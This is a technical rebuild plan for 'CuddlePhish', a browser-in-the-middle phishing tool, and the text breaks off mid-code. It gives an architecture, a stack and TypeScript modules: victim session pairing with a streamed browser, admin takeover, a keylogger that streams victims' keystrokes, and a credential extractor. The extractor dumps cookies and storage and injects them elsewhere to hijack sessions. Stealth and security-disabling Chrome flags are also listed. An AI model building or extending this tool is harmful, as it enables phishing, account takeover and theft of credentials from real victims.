# Modern Rebuild Plan for CuddlePhish

## Executive Summary

This document outlines a comprehensive plan for rebuilding CuddlePhish from scratch using modern frameworks, technologies, and best practices. The goal is to create a more maintainable, scalable, and feature-rich browser-in-the-middle (BitM) tool while preserving the core functionality.

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Technology Stack](#technology-stack)
3. [Core Components](#core-components)
4. [Implementation Details](#implementation-details)
5. [Modern Improvements](#modern-improvements)
6. [Development Roadmap](#development-roadmap)
7. [Testing Strategy](#testing-strategy)
8. [Deployment Considerations](#deployment-considerations)

---

## Architecture Overview

### Current Architecture Analysis

**Current Stack:**
- Backend: Node.js (ES Modules) with Fastify
- WebSockets: Socket.IO (via fastify-socket.io)
- Browser Automation: Puppeteer with Stealth Plugin
- Frontend: Vanilla JavaScript, jQuery, Bootstrap 5
- Virtual Display: Xvfb for headless browser rendering
- Reverse Proxy: Caddy with TLS termination

**Key Workflows:**
1. **Victim Flow**: Victim visits phishing site → Connects via WebSocket → Gets paired with browser instance → Receives WebRTC video stream → Sends input events
2. **Browser Flow**: Puppeteer launches Chrome → Opens target site → Opens broadcast page → Checks in via WebSocket → Starts WebRTC stream
3. **Admin Flow**: Admin authenticates → Views all active sessions → Can take control, extract credentials, boot users

### Proposed Modern Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Reverse Proxy Layer                       │
│              (Caddy/Nginx/Traefik with TLS)                  │
└───────────────────────┬─────────────────────────────────────┘
                        │
        ┌───────────────┴───────────────┐
        │                               │
┌───────▼────────┐            ┌────────▼──────────┐
│   Web Server   │            │  WebSocket Server │
│   (Express)    │            │   (Socket.IO)     │
└───────┬────────┘            └────────┬──────────┘
        │                               │
        ├───────────────────────────────┤
        │                               │
┌───────▼───────────────────────────────▼────────┐
│           Application Core                      │
│  ┌──────────────────────────────────────────┐  │
│  │  Session Manager (Redis/Database)        │  │
│  │  Browser Pool Manager                    │  │
│  │  WebRTC Signaling Service                │  │
│  │  Input Event Router                      │  │
│  │  Credential Extractor                    │  │
│  │  Keylogger Service                       │  │
│  └──────────────────────────────────────────┘  │
│                                                 │
│  ┌──────────────────────────────────────────┐  │
│  │       Puppeteer Browser Instances        │  │
│  │  (Managed via BrowserPool)                │  │
│  └──────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
        │
┌───────▼───────────────────────────────────────┐
│         Frontend Applications                  │
│  ┌──────────────┐      ┌──────────────────┐  │
│  │ Victim Page  │      │  Admin Dashboard │  │
│  │ (React/Vue)  │      │   (React/Vue)    │  │
│  └──────────────┘      └──────────────────┘  │
└────────────────────────────────────────────────┘
```

---

## Technology Stack

### Backend

**Core Runtime:**
- **Node.js 20+ LTS** - Modern ES modules, better performance
- **TypeScript 5.x** - Type safety, better developer experience
- **ts-node-dev** or **tsx** - Development with hot reload

**Web Framework:**
- **Express.js 4.x** or **Fastify 4.x** - HTTP server
  - Express: More mature, larger ecosystem
  - Fastify: Faster, more modern, better TypeScript support
  - **Recommendation**: Fastify for better performance and modern features

**WebSocket/Real-time:**
- **Socket.IO 4.x** - Real-time bidirectional communication
  - Better room management
  - Namespace support for admin/victim separation
  - Improved error handling

**Browser Automation:**
- **Puppeteer 21.x** - Chrome DevTools Protocol wrapper
- **puppeteer-extra** with **puppeteer-extra-plugin-stealth**
- **puppeteer-extra-plugin-adblocker** (optional) - Reduce bandwidth
- Consider **Playwright** as alternative - Better cross-browser support, more modern API

**Session Management:**
- **Redis** - Session state, browser pool management, pub/sub for scaling
- **PostgreSQL** or **SQLite** - Persistent storage for:
  - Target configurations
  - Session logs
  - Credential artifacts
  - Admin audit logs

**Virtual Display:**
- **Xvfb** - Current solution (works well)
- **X11vnc** - Alternative for remote debugging
- Consider **Docker containers** with virtual display pre-configured

**Dependency Injection & Structure:**
- **inversify** or **tsyringe** - Dependency injection
- **Modular architecture** with clear separation of concerns

### Frontend

**Victim Page:**
- **React 18+** or **Vue 3** with TypeScript
- **Vite** - Build tool (faster than Webpack)
- Minimal bundle size - Consider **Preact** for smaller footprint
- **WebRTC adapter.js** - Cross-browser WebRTC compatibility

**Admin Dashboard:**
- **React 18+** with **TypeScript**
- **React Query/TanStack Query** - Server state management
- **Zustand** or **Redux Toolkit** - Client state management
- **React Router** - Client-side routing
- **Tailwind CSS** or **Material-UI** - Modern styling
- **Recharts** or **Chart.js** - Analytics visualization
- **React Hook Form** - Form management

**Build Tools:**
- **Vite** - Fast dev server, optimized builds
- **ESBuild** - Lightning-fast bundling
- **TypeScript** - Type checking

### Infrastructure & DevOps

**Containerization:**
- **Docker** - Application containerization
- **Docker Compose** - Local development environment
- **Multi-stage builds** - Smaller production images

**Orchestration:**
- **Kubernetes** (optional) - For scaling across multiple nodes
- **Docker Swarm** - Simpler alternative for multi-host

**Monitoring & Logging:**
- **Winston** or **Pino** - Structured logging
- **Prometheus** + **Grafana** - Metrics and monitoring
- **Sentry** - Error tracking (optional)

**Configuration Management:**
- **dotenv** - Environment variables
- **Zod** or **Joi** - Configuration validation
- **YAML config files** - More readable than JSON

### Security & Authentication

- **JWT** - Token-based authentication for admin
- **bcrypt** or **argon2** - Password hashing
- **Rate limiting** - Express-rate-limit or fastify-rate-limit
- **Helmet.js** - Security headers
- **CORS** - Proper CORS configuration

---

## Core Components

### 1. Session Manager

**Purpose**: Manage victim-browser pairings, session state, lifecycle

**Responsibilities:**
- Create new sessions when victims connect
- Pair victims with available browser instances
- Track session metadata (IP, user agent, timestamps)
- Handle session cleanup on disconnect
- Persist session data to database

**Modern Implementation:**
```typescript
interface Session {
  id: string;
  browserId: string;
  victimSocketId: string;
  adminSocketId?: string;
  victimIp: string;
  userAgent: string;
  viewport: { width: number; height: number };
  createdAt: Date;
  lastActivity: Date;
  status: 'active' | 'admin-controlled' | 'terminated';
  keylog: string;
  metadata: Record<string, any>;
}

class SessionManager {
  private sessions: Map<string, Session>;
  private redis: RedisClient;
  
  async createSession(victimSocketId: string, metadata: SessionMetadata): Promise<Session>
  async pairWithBrowser(sessionId: string, browserId: string): Promise<void>
  async updateActivity(sessionId: string): Promise<void>
  async terminateSession(sessionId: string): Promise<void>
  async getSessionByBrowserId(browserId: string): Promise<Session | null>
}
```

**Benefits:**
- Centralized session management
- Redis enables horizontal scaling
- Database persistence for forensics
- Better cleanup and resource management

### 2. Browser Pool Manager

**Purpose**: Manage Puppeteer browser instances, lifecycle, resource allocation

**Responsibilities:**
- Pre-create browser pools for faster pairing
- Recycle browsers between sessions (optional)
- Manage browser cleanup and resource limits
- Handle browser crashes gracefully
- Track browser availability

**Modern Implementation:**
```typescript
interface BrowserInstance {
  id: string;
  puppeteerBrowser: Browser;
  targetPage: Page;
  broadcastPage: Page;
  xvfb: XvfbInstance;
  userDataDir: string;
  socketId: string;
  status: 'idle' | 'paired' | 'admin-controlled' | 'error';
  createdAt: Date;
  lastUsed: Date;
  keylogFile: WriteStream;
}

class BrowserPoolManager {
  private browsers: Map<string, BrowserInstance>;
  private idleBrowsers: Queue<BrowserInstance>;
  private maxBrowsers: number;
  
  async createBrowser(targetUrl: string): Promise<BrowserInstance>
  async getAvailableBrowser(): Promise<BrowserInstance | null>
  async reserveBrowser(browserId: string, sessionId: string): Promise<void>
  async releaseBrowser(browserId: string): Promise<void>
  async cleanupBrowser(browserId: string): Promise<void>
  async cleanupIdleBrowsers(maxAge: number): Promise<void>
}
```

**Improvements:**
- Connection pooling for better performance
- Health checks and automatic recovery
- Resource limits (max concurrent browsers)
- Better error handling and logging

### 3. WebRTC Signaling Service

**Purpose**: Broker WebRTC connections between browsers and victims

**Responsibilities:**
- Forward SDP offers/answers between peers
- Forward ICE candidates
- Handle connection failures and renegotiation
- Support multiple viewers (admin takeover)

**Modern Implementation:**
```typescript
class WebRTCSignalingService {
  private io: Server;
  private sessions: Map<string, RTCPeerConnection[]>;
  
  setupSignaling(io: Server): void {
    // Namespace for victims
    const victimNamespace = io.of('/victim');
    // Namespace for browsers
    const browserNamespace = io.of('/browser');
    // Namespace for admin
    const adminNamespace = io.of('/admin');
    
    this.handleVictimSignaling(victimNamespace);
    this.handleBrowserSignaling(browserNamespace);
    this.handleAdminSignaling(adminNamespace);
  }
  
  private handleOffer(browserId: string, viewerId: string, offer: RTCSessionDescription): void
  private handleAnswer(browserId: string, viewerId: string, answer: RTCSessionDescription): void
  private handleIceCandidate(from: string, to: string, candidate: RTCIceCandidate): void
}
```

**Improvements:**
- Namespace-based separation (better security)
- Support for TURN servers (better NAT traversal)
- Connection quality monitoring
- Automatic reconnection handling

### 4. Input Event Router

**Purpose**: Route mouse/keyboard events from victims to browser instances

**Responsibilities:**
- Receive input events from victims
- Route to correct browser instance
- Handle admin takeover (priority routing)
- Coordinate viewport synchronization
- Support clipboard operations

**Modern Implementation:**
```typescript
interface InputEvent {
  type: 'mousedown' | 'mouseup' | 'mousemove' | 'click' | 'mousewheel' | 
        'keydown' | 'keyup' | 'paste';
  sessionId: string;
  data: MouseEventData | KeyboardEventData | PasteEventData;
  timestamp: number;
}

class InputEventRouter {
  private sessionManager: SessionManager;
  private browserPool: BrowserPoolManager;
  
  async routeEvent(event: InputEvent): Promise<void> {
    const session = await this.sessionManager.getSession(event.sessionId);
    const browser = await this.browserPool.getBrowser(session.browserId);
    
    // Check if admin has control
    if (session.status === 'admin-controlled' && event.victimSocketId === session.victimSocketId) {
      // Ignore victim input when admin is controlling
      return;
    }
    
    await this.executeEvent(browser, event);
  }
  
  private async executeEvent(browser: BrowserInstance, event: InputEvent): Promise<void>
}
```

**Improvements:**
- Event queuing for high-frequency events
- Input validation and sanitization
- Rate limiting per session
- Better coordinate translation (viewport differences)

### 5. Credential Extractor

**Purpose**: Extract cookies, localStorage, sessionStorage from browser instances

**Responsibilities:**
- Extract cookies via CDP
- Extract localStorage and sessionStorage
- Extract IndexedDB (if needed)
- Save credentials in secure format
- Support credential injection (stealer.js functionality)

**Modern Implementation:**
```typescript
interface CredentialData {
  cookies: Cookie[];
  localStorage: Record<string, string>;
  sessionStorage: Record<string, string>;
  indexedDB?: any; // Optional
  url: string;
  extractedAt: Date;
}

class CredentialExtractor {
  async extractCredentials(browserId: string): Promise<CredentialData> {
    const browser = await this.browserPool.getBrowser(browserId);
    const page = browser.targetPage;
    
    const [cookies, localStorage, sessionStorage] = await Promise.all([
      this.extractCookies(page),
      this.extractLocalStorage(page),
      this.extractSessionStorage(page),
    ]);
    
    return {
      cookies,
      localStorage,
      sessionStorage,
      url: page.url(),
      extractedAt: new Date(),
    };
  }
  
  // Use public Puppeteer API
  private async extractCookies(page: Page): Promise<Cookie[]> {
    return await page.cookies();
  }
  
  // Use page.evaluate() - public API
  private async extractLocalStorage(page: Page): Promise<Record<string, string>> {
    return await page.evaluate(() => {
      const storage: Record<string, string> = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          storage[key] = localStorage.getItem(key) || '';
        }
      }
      return storage;
    });
  }
  
  private async extractSessionStorage(page: Page): Promise<Record<string, string>> {
    return await page.evaluate(() => {
      const storage: Record<string, string> = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          storage[key] = sessionStorage.getItem(key) || '';
        }
      }
      return storage;
    });
  }
  
  async saveCredentials(browserId: string, credentials: CredentialData): Promise<string>
  
  // Inject credentials using public APIs
  async injectCredentials(browser: BrowserInstance, credentials: CredentialData): Promise<void> {
    const page = browser.targetPage;
    
    // Set cookies using public API
    await page.setCookie(...credentials.cookies);
    
    // Inject localStorage via evaluate
    await page.evaluate((storage) => {
      Object.entries(storage).forEach(([key, value]) => {
        localStorage.setItem(key, value);
      });
    }, credentials.localStorage);
    
    // Inject sessionStorage similarly
    await page.evaluate((storage) => {
      Object.entries(storage).forEach(([key, value]) => {
        sessionStorage.setItem(key, value);
      });
    }, credentials.sessionStorage);
  }
}
```

**Improvements:**
- Support for more storage types (IndexedDB, WebSQL)
- Encrypted storage of credentials
- Automatic extraction on login detection
- Better format for credential reuse

### 6. Keylogger Service

**Purpose**: Capture and process keystrokes from victim sessions

**Responsibilities:**
- Capture raw keystrokes
- Process backspaces and special keys
- Store keylogs per session
- Stream keylogs to admin dashboard
- Handle paste events

**Modern Implementation:**
```typescript
class KeyloggerService {
  private keylogs: Map<string, string>;
  private keylogFiles: Map<string, WriteStream>;
  
  logKey(sessionId: string, key: string, eventType: 'down' | 'up'): void {
    const currentLog = this.keylogs.get(sessionId) || '';
    
    let newLog = currentLog;
    if (eventType === 'down') {
      if (key === 'Backspace') {
        newLog = currentLog.slice(0, -1);
      } else if (key === 'Enter' || key === 'Tab') {
        newLog = currentLog + '\n';
      } else if (key.length === 1) {
        newLog = currentLog + key;
      }
    }
    
    this.keylogs.set(sessionId, newLog);
    this.writeToFile(sessionId, key);
    this.emitToAdmin(sessionId, newLog);
  }
  
  private writeToFile(sessionId: string, key: string): void
  private emitToAdmin(sessionId: string, keylog: string): void
}
```

**Improvements:**
- Better handling of modifier keys
- Support for international keyboards
- Real-time streaming to admin
- Search/filter capabilities in admin UI

---

## Implementation Details

### Project Structure

```
cuddlephish-modern/
├── src/
│   ├── server/
│   │   ├── index.ts                 # Main server entry point
│   │   ├── config/
│   │   │   ├── config.ts            # Configuration management
│   │   │   └── env.ts               # Environment variables
│   │   ├── http/
│   │   │   ├── routes/
│   │   │   │   ├── victim.ts        # Victim page route
│   │   │   │   ├── admin.ts         # Admin page route
│   │   │   │   └── broadcast.ts     # Browser broadcast route
│   │   │   └── middleware/
│   │   │       ├── auth.ts          # Authentication middleware
│   │   │       └── rateLimit.ts     # Rate limiting
│   │   ├── websocket/
│   │   │   ├── namespaces/
│   │   │   │   ├── victim.ts        # Victim namespace handlers
│   │   │   │   ├── browser.ts       # Browser namespace handlers
│   │   │   │   └── admin.ts         # Admin namespace handlers
│   │   │   └── signaling.ts         # WebRTC signaling logic
│   │   ├── services/
│   │   │   ├── SessionManager.ts
│   │   │   ├── BrowserPoolManager.ts
│   │   │   ├── WebRTCSignalingService.ts
│   │   │   ├── InputEventRouter.ts
│   │   │   ├── CredentialExtractor.ts
│   │   │   └── KeyloggerService.ts
│   │   ├── browser/
│   │   │   ├── BrowserInstance.ts   # Browser wrapper class
│   │   │   ├── BrowserFactory.ts    # Browser creation
│   │   │   └── XvfbManager.ts       # Xvfb lifecycle
│   │   ├── database/
│   │   │   ├── models/
│   │   │   │   ├── Session.ts
│   │   │   │   ├── Target.ts
│   │   │   │   └── Credential.ts
│   │   │   └── migrations/
│   │   └── utils/
│   │       ├── logger.ts
│   │       └── validators.ts
│   ├── client/
│   │   ├── victim/
│   │   │   ├── src/
│   │   │   │   ├── App.tsx
│   │   │   │   ├── components/
│   │   │   │   │   └── VideoStream.tsx
│   │   │   │   ├── hooks/
│   │   │   │   │   ├── useWebRTC.ts
│   │   │   │   │   └── useSocket.ts
│   │   │   │   └── utils/
│   │   │   └── index.html
│   │   ├── admin/
│   │   │   ├── src/
│   │   │   │   ├── App.tsx
│   │   │   │   ├── pages/
│   │   │   │   │   ├── Dashboard.tsx
│   │   │   │   │   └── Settings.tsx
│   │   │   │   ├── components/
│   │   │   │   │   ├── SessionCard.tsx
│   │   │   │   │   ├── VideoViewer.tsx
│   │   │   │   │   └── KeylogViewer.tsx
│   │   │   │   └── hooks/
│   │   │   └── index.html
│   │   └── broadcast/
│   │       └── src/
│   │           └── broadcast.ts     # Browser broadcast script
│   ├── shared/
│   │   ├── types/
│   │   │   ├── session.ts
│   │   │   ├── browser.ts
│   │   │   └── events.ts
│   │   └── constants/
│   ├── scripts/
│   │   ├── add-target.ts
│   │   └── inject-credentials.ts
│   └── cli/
│       └── index.ts                 # CLI interface
├── docker/
│   ├── Dockerfile
│   ├── Dockerfile.dev
│   └── docker-compose.yml
├── tests/
│   ├── unit/
│   ├── integration/
│   └── e2e/
├── docs/
├── package.json
├── tsconfig.json
├── vite.config.ts
└── README.md
```

### Configuration Management

**Modern Config with Validation:**
```typescript
// src/server/config/config.ts
import { z } from 'zod';

const ConfigSchema = z.object({
  server: z.object({
    port: z.number().default(58082),
    host: z.string().default('0.0.0.0'),
  }),
  admin: z.object({
    allowedIps: z.array(z.string()),
    socketKey: z.string().min(32),
    jwtSecret: z.string().min(32),
  }),
  browser: z.object({
    maxInstances: z.number().default(10),
    idleTimeout: z.number().default(300000), // 5 minutes
    userDataBasePath: z.string().default('./user_data'),
    defaultUserAgent: z.string(),
  }),
  webrtc: z.object({
    stunServers: z.array(z.object({
      urls: z.string(),
    })),
    turnServers: z.array(z.object({
      urls: z.string(),
      username: z.string().optional(),
      credential: z.string().optional(),
    })).optional(),
  }),
  database: z.object({
    type: z.enum(['sqlite', 'postgresql']),
    connectionString: z.string(),
  }),
  redis: z.object({
    host: z.string().default('localhost'),
    port: z.number().default(6379),
  }),
});

export type Config = z.infer<typeof ConfigSchema>;
export const config = ConfigSchema.parse(loadFromEnv());
```

### Type-Safe Event System

```typescript
// src/shared/types/events.ts
export interface SocketEvents {
  // Victim events
  'victim:connect': { viewport: { width: number; height: number }; ip: string };
  'victim:input': InputEvent;
  'victim:webrtc:offer': { browserId: string; offer: RTCSessionDescriptionInit };
  'victim:webrtc:answer': { browserId: string; answer: RTCSessionDescriptionInit };
  'victim:webrtc:candidate': { browserId: string; candidate: RTCIceCandidateInit };
  
  // Browser events
  'browser:ready': { browserId: string };
  'browser:webrtc:offer': { viewerId: string; offer: RTCSessionDescriptionInit };
  'browser:webrtc:answer': { viewerId: string; answer: RTCSessionDescriptionInit };
  'browser:webrtc:candidate': { viewerId: string; candidate: RTCIceCandidateInit };
  'browser:thumbnail': { browserId: string; image: string };
  
  // Admin events
  'admin:session:list': Session[];
  'admin:session:takeover': { browserId: string; viewport: { width: number; height: number } };
  'admin:session:release': { browserId: string };
  'admin:session:boot': { browserId: string };
  'admin:credentials:extract': { browserId: string };
  'admin:credentials:result': { browserId: string; credentials: CredentialData };
}
```

### Example Server Implementation

```typescript
// src/server/index.ts
import Fastify from 'fastify';
import { Server as SocketIOServer } from 'socket.io';
import { config } from './config/config';
import { setupWebSocket } from './websocket';
import { setupRoutes } from './http/routes';
import { logger } from './utils/logger';
import { SessionManager } from './services/SessionManager';
import { BrowserPoolManager } from './services/BrowserPoolManager';

const app = Fastify({
  logger: logger,
});

// Setup HTTP routes
setupRoutes(app);

// Setup Socket.IO
const io = new SocketIOServer(app.server, {
  cors: { origin: '*' }, // Configure appropriately
  path: '/socket.io',
});

// Initialize services
const sessionManager = new SessionManager();
const browserPoolManager = new BrowserPoolManager(config.browser);

// Setup WebSocket handlers
setupWebSocket(io, sessionManager, browserPoolManager);

// Graceful shutdown
process.on('SIGTERM', async () => {
  logger.info('SIGTERM received, shutting down gracefully');
  await browserPoolManager.cleanupAll();
  await app.close();
  process.exit(0);
});

// Start server
const start = async () => {
  try {
    await app.listen({ port: config.server.port, host: config.server.host });
    logger.info(`Server listening on ${config.server.host}:${config.server.port}`);
  } catch (err) {
    logger.error(err);
    process.exit(1);
  }
};

start();
```

---

## Modern Improvements

### 1. Type Safety

**Current State**: Vanilla JavaScript, minimal type checking
**Improvement**: Full TypeScript implementation
- Catch errors at compile time
- Better IDE support
- Self-documenting code
- Refactoring safety

### 2. Modular Architecture

**Current State**: Monolithic index.js file
**Improvement**: Modular service-based architecture
- Separation of concerns
- Testability
- Reusability
- Easier maintenance

### 3. Better Error Handling

**Current State**: Basic try/catch, console.log errors
**Improvement**: Structured error handling
- Custom error classes
- Error boundaries
- Comprehensive logging
- Error tracking (Sentry)

### 4. State Management

**Current State**: In-memory arrays, manual state tracking
**Improvement**: Redis + Database
- Persistence across restarts
- Horizontal scaling
- Better session tracking
- Audit trails

### 5. Modern Frontend

**Current State**: jQuery, vanilla JS, inline styles
**Improvement**: React/Vue with modern tooling
- Component-based architecture
- Better state management
- Improved UX
- Responsive design
- Real-time updates

### 6. Testing

**Current State**: No tests
**Improvement**: Comprehensive test suite
- Unit tests (Jest/Vitest)
- Integration tests
- E2E tests (Playwright)
- Test coverage reporting

### 7. Monitoring & Observability

**Current State**: Console.log statements
**Improvement**: Structured logging and metrics
- Winston/Pino for logging
- Prometheus metrics
- Grafana dashboards
- Health check endpoints

### 8. Security Enhancements

**Improvements:**
- JWT-based admin authentication
- Rate limiting
- Input validation
- CSRF protection
- Security headers (Helmet)
- Secrets management (environment variables, not hardcoded)

### 9. Performance Optimizations

**Improvements:**
- Browser connection pooling
- WebRTC optimization (adaptive bitrate)
- Compression for WebSocket messages
- CDN for static assets
- Database query optimization
- Caching strategies

### 10. Developer Experience

**Improvements:**
- Hot module reloading
- Docker development environment
- Clear documentation
- TypeScript strict mode
- ESLint + Prettier
- Pre-commit hooks (Husky)

---

## Development Roadmap

### Phase 1: Foundation (Weeks 1-2)
- [ ] Project setup (TypeScript, build tools)
- [ ] Basic Express/Fastify server
- [ ] Socket.IO integration
- [ ] Configuration management
- [ ] Database schema design
- [ ] Docker setup

### Phase 2: Core Services (Weeks 3-4)
- [ ] SessionManager implementation
- [ ] BrowserPoolManager implementation
- [ ] Basic Puppeteer integration
- [ ] Xvfb integration
- [ ] WebRTC signaling service

### Phase 3: Input/Output (Weeks 5-6)
- [ ] Input event routing
- [ ] Keylogger service
- [ ] Credential extractor
- [ ] Basic WebRTC streaming (victim → browser)

### Phase 4: Frontend - Victim Page (Weeks 7-8)
- [ ] React/Vue setup
- [ ] WebRTC client implementation
- [ ] Input capture (mouse/keyboard)
- [ ] Video display
- [ ] Basic styling

### Phase 5: Frontend - Admin Dashboard (Weeks 9-11)
- [ ] Admin authentication
- [ ] Session list view
- [ ] Video viewer component
- [ ] Keylog viewer
- [ ] Control buttons (takeover, boot, etc.)
- [ ] Credential download
- [ ] Analytics dashboard

### Phase 6: Browser Broadcast (Weeks 12-13)
- [ ] Broadcast page (modern implementation)
- [ ] WebRTC screen capture
- [ ] Thumbnail generation
- [ ] Multi-viewer support

### Phase 7: Polish & Testing (Weeks 14-16)
- [ ] Error handling improvements
- [ ] Comprehensive testing
- [ ] Performance optimization
- [ ] Security audit
- [ ] Documentation
- [ ] Deployment guides

### Phase 8: Advanced Features (Weeks 17+)
- [ ] Multi-target support
- [ ] Session recording/playback
- [ ] Advanced analytics
- [ ] Plugin system
- [ ] API for automation
- [ ] Distributed deployment (Kubernetes)

---

## Testing Strategy

### Unit Tests
- **Framework**: Vitest or Jest
- **Coverage Target**: 80%+
- **Focus Areas**:
  - Service layer logic
  - Utility functions
  - Event routing
  - State management

### Integration Tests
- **Framework**: Jest + Supertest
- **Focus Areas**:
  - HTTP endpoints
  - WebSocket events
  - Database operations
  - Browser lifecycle

### E2E Tests
- **Framework**: Playwright
- **Focus Areas**:
  - Full victim flow
  - Admin dashboard functionality
  - WebRTC connection
  - Input forwarding

### Test Structure
```
tests/
├── unit/
│   ├── services/
│   ├── utils/
│   └── browser/
├── integration/
│   ├── api/
│   ├── websocket/
│   └── database/
└── e2e/
    ├── victim-flow.spec.ts
    ├── admin-flow.spec.ts
    └── webrtc-flow.spec.ts
```

---

## Deployment Considerations

### Containerization

**Dockerfile Strategy:**
```dockerfile
# Multi-stage build
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
COPY tsconfig.json ./
COPY src ./src
RUN npm ci && npm run build

FROM node:20-alpine
RUN apk add --no-cache \
    chromium \
    xvfb \
    ttf-freefont \
    font-noto-emoji
WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
COPY package*.json ./
EXPOSE 58082
CMD ["node", "dist/server/index.js"]
```

### Environment Variables

```bash
# Server
SERVER_PORT=58082
SERVER_HOST=0.0.0.0

# Admin
ADMIN_ALLOWED_IPS=1.1.1.1,2.2.2.2
ADMIN_SOCKET_KEY=<secure-random-key>
JWT_SECRET=<secure-random-secret>

# Browser
BROWSER_MAX_INSTANCES=10
BROWSER_IDLE_TIMEOUT=300000

# Database
DATABASE_TYPE=postgresql
DATABASE_URL=postgresql://user:pass@localhost:5432/cuddlephish

# Redis
REDIS_HOST=localhost
REDIS_PORT=6379

# WebRTC
STUN_SERVERS=stun:stun.l.google.com:19302
TURN_SERVERS=turn:your-turn-server.com:3478
TURN_USERNAME=user
TURN_CREDENTIAL=pass
```

### Docker Compose

```yaml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "58082:58082"
    environment:
      - DATABASE_URL=postgresql://postgres:postgres@db:5432/cuddlephish
      - REDIS_HOST=redis
    depends_on:
      - db
      - redis
    volumes:
      - ./user_data:/app/user_data
      - ./targets.json:/app/targets.json

  db:
    image: postgres:15-alpine
    environment:
      - POSTGRES_DB=cuddlephish
      - POSTGRES_USER=postgres
      - POSTGRES_PASSWORD=postgres
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"

volumes:
  postgres_data:
```

### Production Deployment

**Considerations:**
- Use reverse proxy (Caddy/Nginx) for TLS
- Separate database and Redis instances
- Use managed services (RDS, ElastiCache) for production
- Implement health checks and auto-restart
- Set up log aggregation
- Use secrets management (AWS Secrets Manager, Vault)
- Implement monitoring and alerting
- Consider horizontal scaling with Redis pub/sub

---

## Additional Implementation Details & Considerations

### WebRTC Implementation Deep Dive

#### Connection Establishment Flow

**Current Flow:**
1. Browser instance opens broadcast.html
2. Browser requests screen capture via `getDisplayMedia()`
3. Server pairs victim with browser
4. Server tells browser to stream to victim socket ID
5. Browser creates offer, sends to server
6. Server forwards offer to victim
7. Victim creates answer, sends to server
8. Server forwards answer to browser
9. ICE candidates exchanged
10. Connection established

**Modern Improvements:**

```typescript
// Better connection state management
enum ConnectionState {
  INITIALIZING = 'initializing',
  OFFER_SENT = 'offer_sent',
  ANSWER_RECEIVED = 'answer_received',
  ICE_GATHERING = 'ice_gathering',
  ICE_COMPLETE = 'ice_complete',
  CONNECTED = 'connected',
  DISCONNECTED = 'disconnected',
  FAILED = 'failed',
}

class WebRTCConnection {
  private state: ConnectionState;
  private peerConnection: RTCPeerConnection;
  private reconnectAttempts: number = 0;
  private maxReconnectAttempts: number = 3;
  
  async establishConnection(): Promise<void> {
    try {
      this.state = ConnectionState.INITIALIZING;
      await this.createOffer();
      this.state = ConnectionState.OFFER_SENT;
      // ... rest of flow
    } catch (error) {
      await this.handleConnectionFailure(error);
    }
  }
  
  private async handleConnectionFailure(error: Error): Promise<void> {
    if (this.reconnectAttempts < this.maxReconnectAttempts) {
      await this.delay(1000 * (this.reconnectAttempts + 1)); // Exponential backoff
      this.reconnectAttempts++;
      await this.establishConnection();
    } else {
      this.state = ConnectionState.FAILED;
      this.emit('connection-failed', error);
    }
  }
}
```

#### STUN/TURN Server Configuration

**Common Issues:**
- Symmetric NAT preventing STUN from working
- Firewall rules blocking WebRTC traffic
- Corporate networks with restrictive NAT

**Solutions:**

```typescript
// Configurable STUN/TURN with fallback
const getIceServers = (config: Config): RTCIceServer[] => {
  const servers: RTCIceServer[] = [];
  
  // Primary STUN servers
  servers.push(...config.webrtc.stunServers);
  
  // TURN servers (higher priority, more reliable)
  if (config.webrtc.turnServers && config.webrtc.turnServers.length > 0) {
    servers.push(...config.webrtc.turnServers);
  } else {
    // Fallback to public STUN
    servers.push({
      urls: 'stun:stun.l.google.com:19302',
    }, {
      urls: 'stun:stun1.l.google.com:19302',
    });
  }
  
  return servers;
};

// Connection quality monitoring
peerConnection.addEventListener('iceconnectionstatechange', () => {
  const state = peerConnection.iceConnectionState;
  logger.info(`ICE Connection State: ${state}`);
  
  if (state === 'failed' || state === 'disconnected') {
    // Attempt renegotiation
    this.initiateRenegotiation();
  }
});
```

#### Tab Selection for Screen Capture

**Current Issue**: `--auto-select-desktop-capture-source` fails with special characters in tab titles or when tab titles change after redirects.

**Improved Solution:**

```typescript
class BrowserBroadcastManager {
  private async waitForTabTitle(page: Page, expectedTitle: string, timeout: number = 10000): Promise<void> {
    const startTime = Date.now();
    while (Date.now() - startTime < timeout) {
      const currentTitle = await page.title();
      // Use substring matching for flexibility
      if (currentTitle.includes(expectedTitle) || this.fuzzyMatch(currentTitle, expectedTitle)) {
        return;
      }
      await this.delay(500);
    }
    throw new Error(`Tab title did not match expected title: ${expectedTitle}`);
  }
  
  private fuzzyMatch(a: string, b: string): boolean {
    // Remove special characters and compare
    const normalize = (s: string) => s.replace(/[^\w\s]/g, '').toLowerCase();
    return normalize(a) === normalize(b);
  }
  
  async startBroadcast(browser: BrowserInstance): Promise<void> {
    // Wait for target page to fully load and title to stabilize
    await this.waitForTabTitle(browser.targetPage, browser.targetConfig.tabTitle);
    
    // Open broadcast page
    await browser.broadcastPage.goto(`http://localhost:${config.server.port}/broadcast?id=${browser.id}`);
    
    // Wait for screen capture to be initiated
    await browser.broadcastPage.waitForFunction(
      () => window.navigator.mediaDevices && window.navigator.mediaDevices.getDisplayMedia,
      { timeout: 10000 }
    );
  }
}
```

### Puppeteer Configuration & Stealth Evasion

#### Comprehensive Browser Args

```typescript
const getPuppeteerArgs = (config: BrowserConfig, xvfbDisplay?: string): string[] => {
  const args = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-features=IsolateOrigins,site-per-process',
    '--window-size=2880,1800',
    '--start-maximized',
    '--ignore-certificate-errors',
    '--ignore-certificate-errors-spki-list',
    '--ignore-ssl-errors',
    '--ignore-certificate-errors-spki-list',
    '--disable-web-security',
    '--disable-features=VizDisplayCompositor',
  ];
  
  // Screen capture for WebRTC
  if (browser.targetConfig.tabTitle) {
    args.push(`--auto-select-desktop-capture-source=${browser.targetConfig.tabTitle}`);
  }
  
  // Xvfb display
  if (xvfbDisplay) {
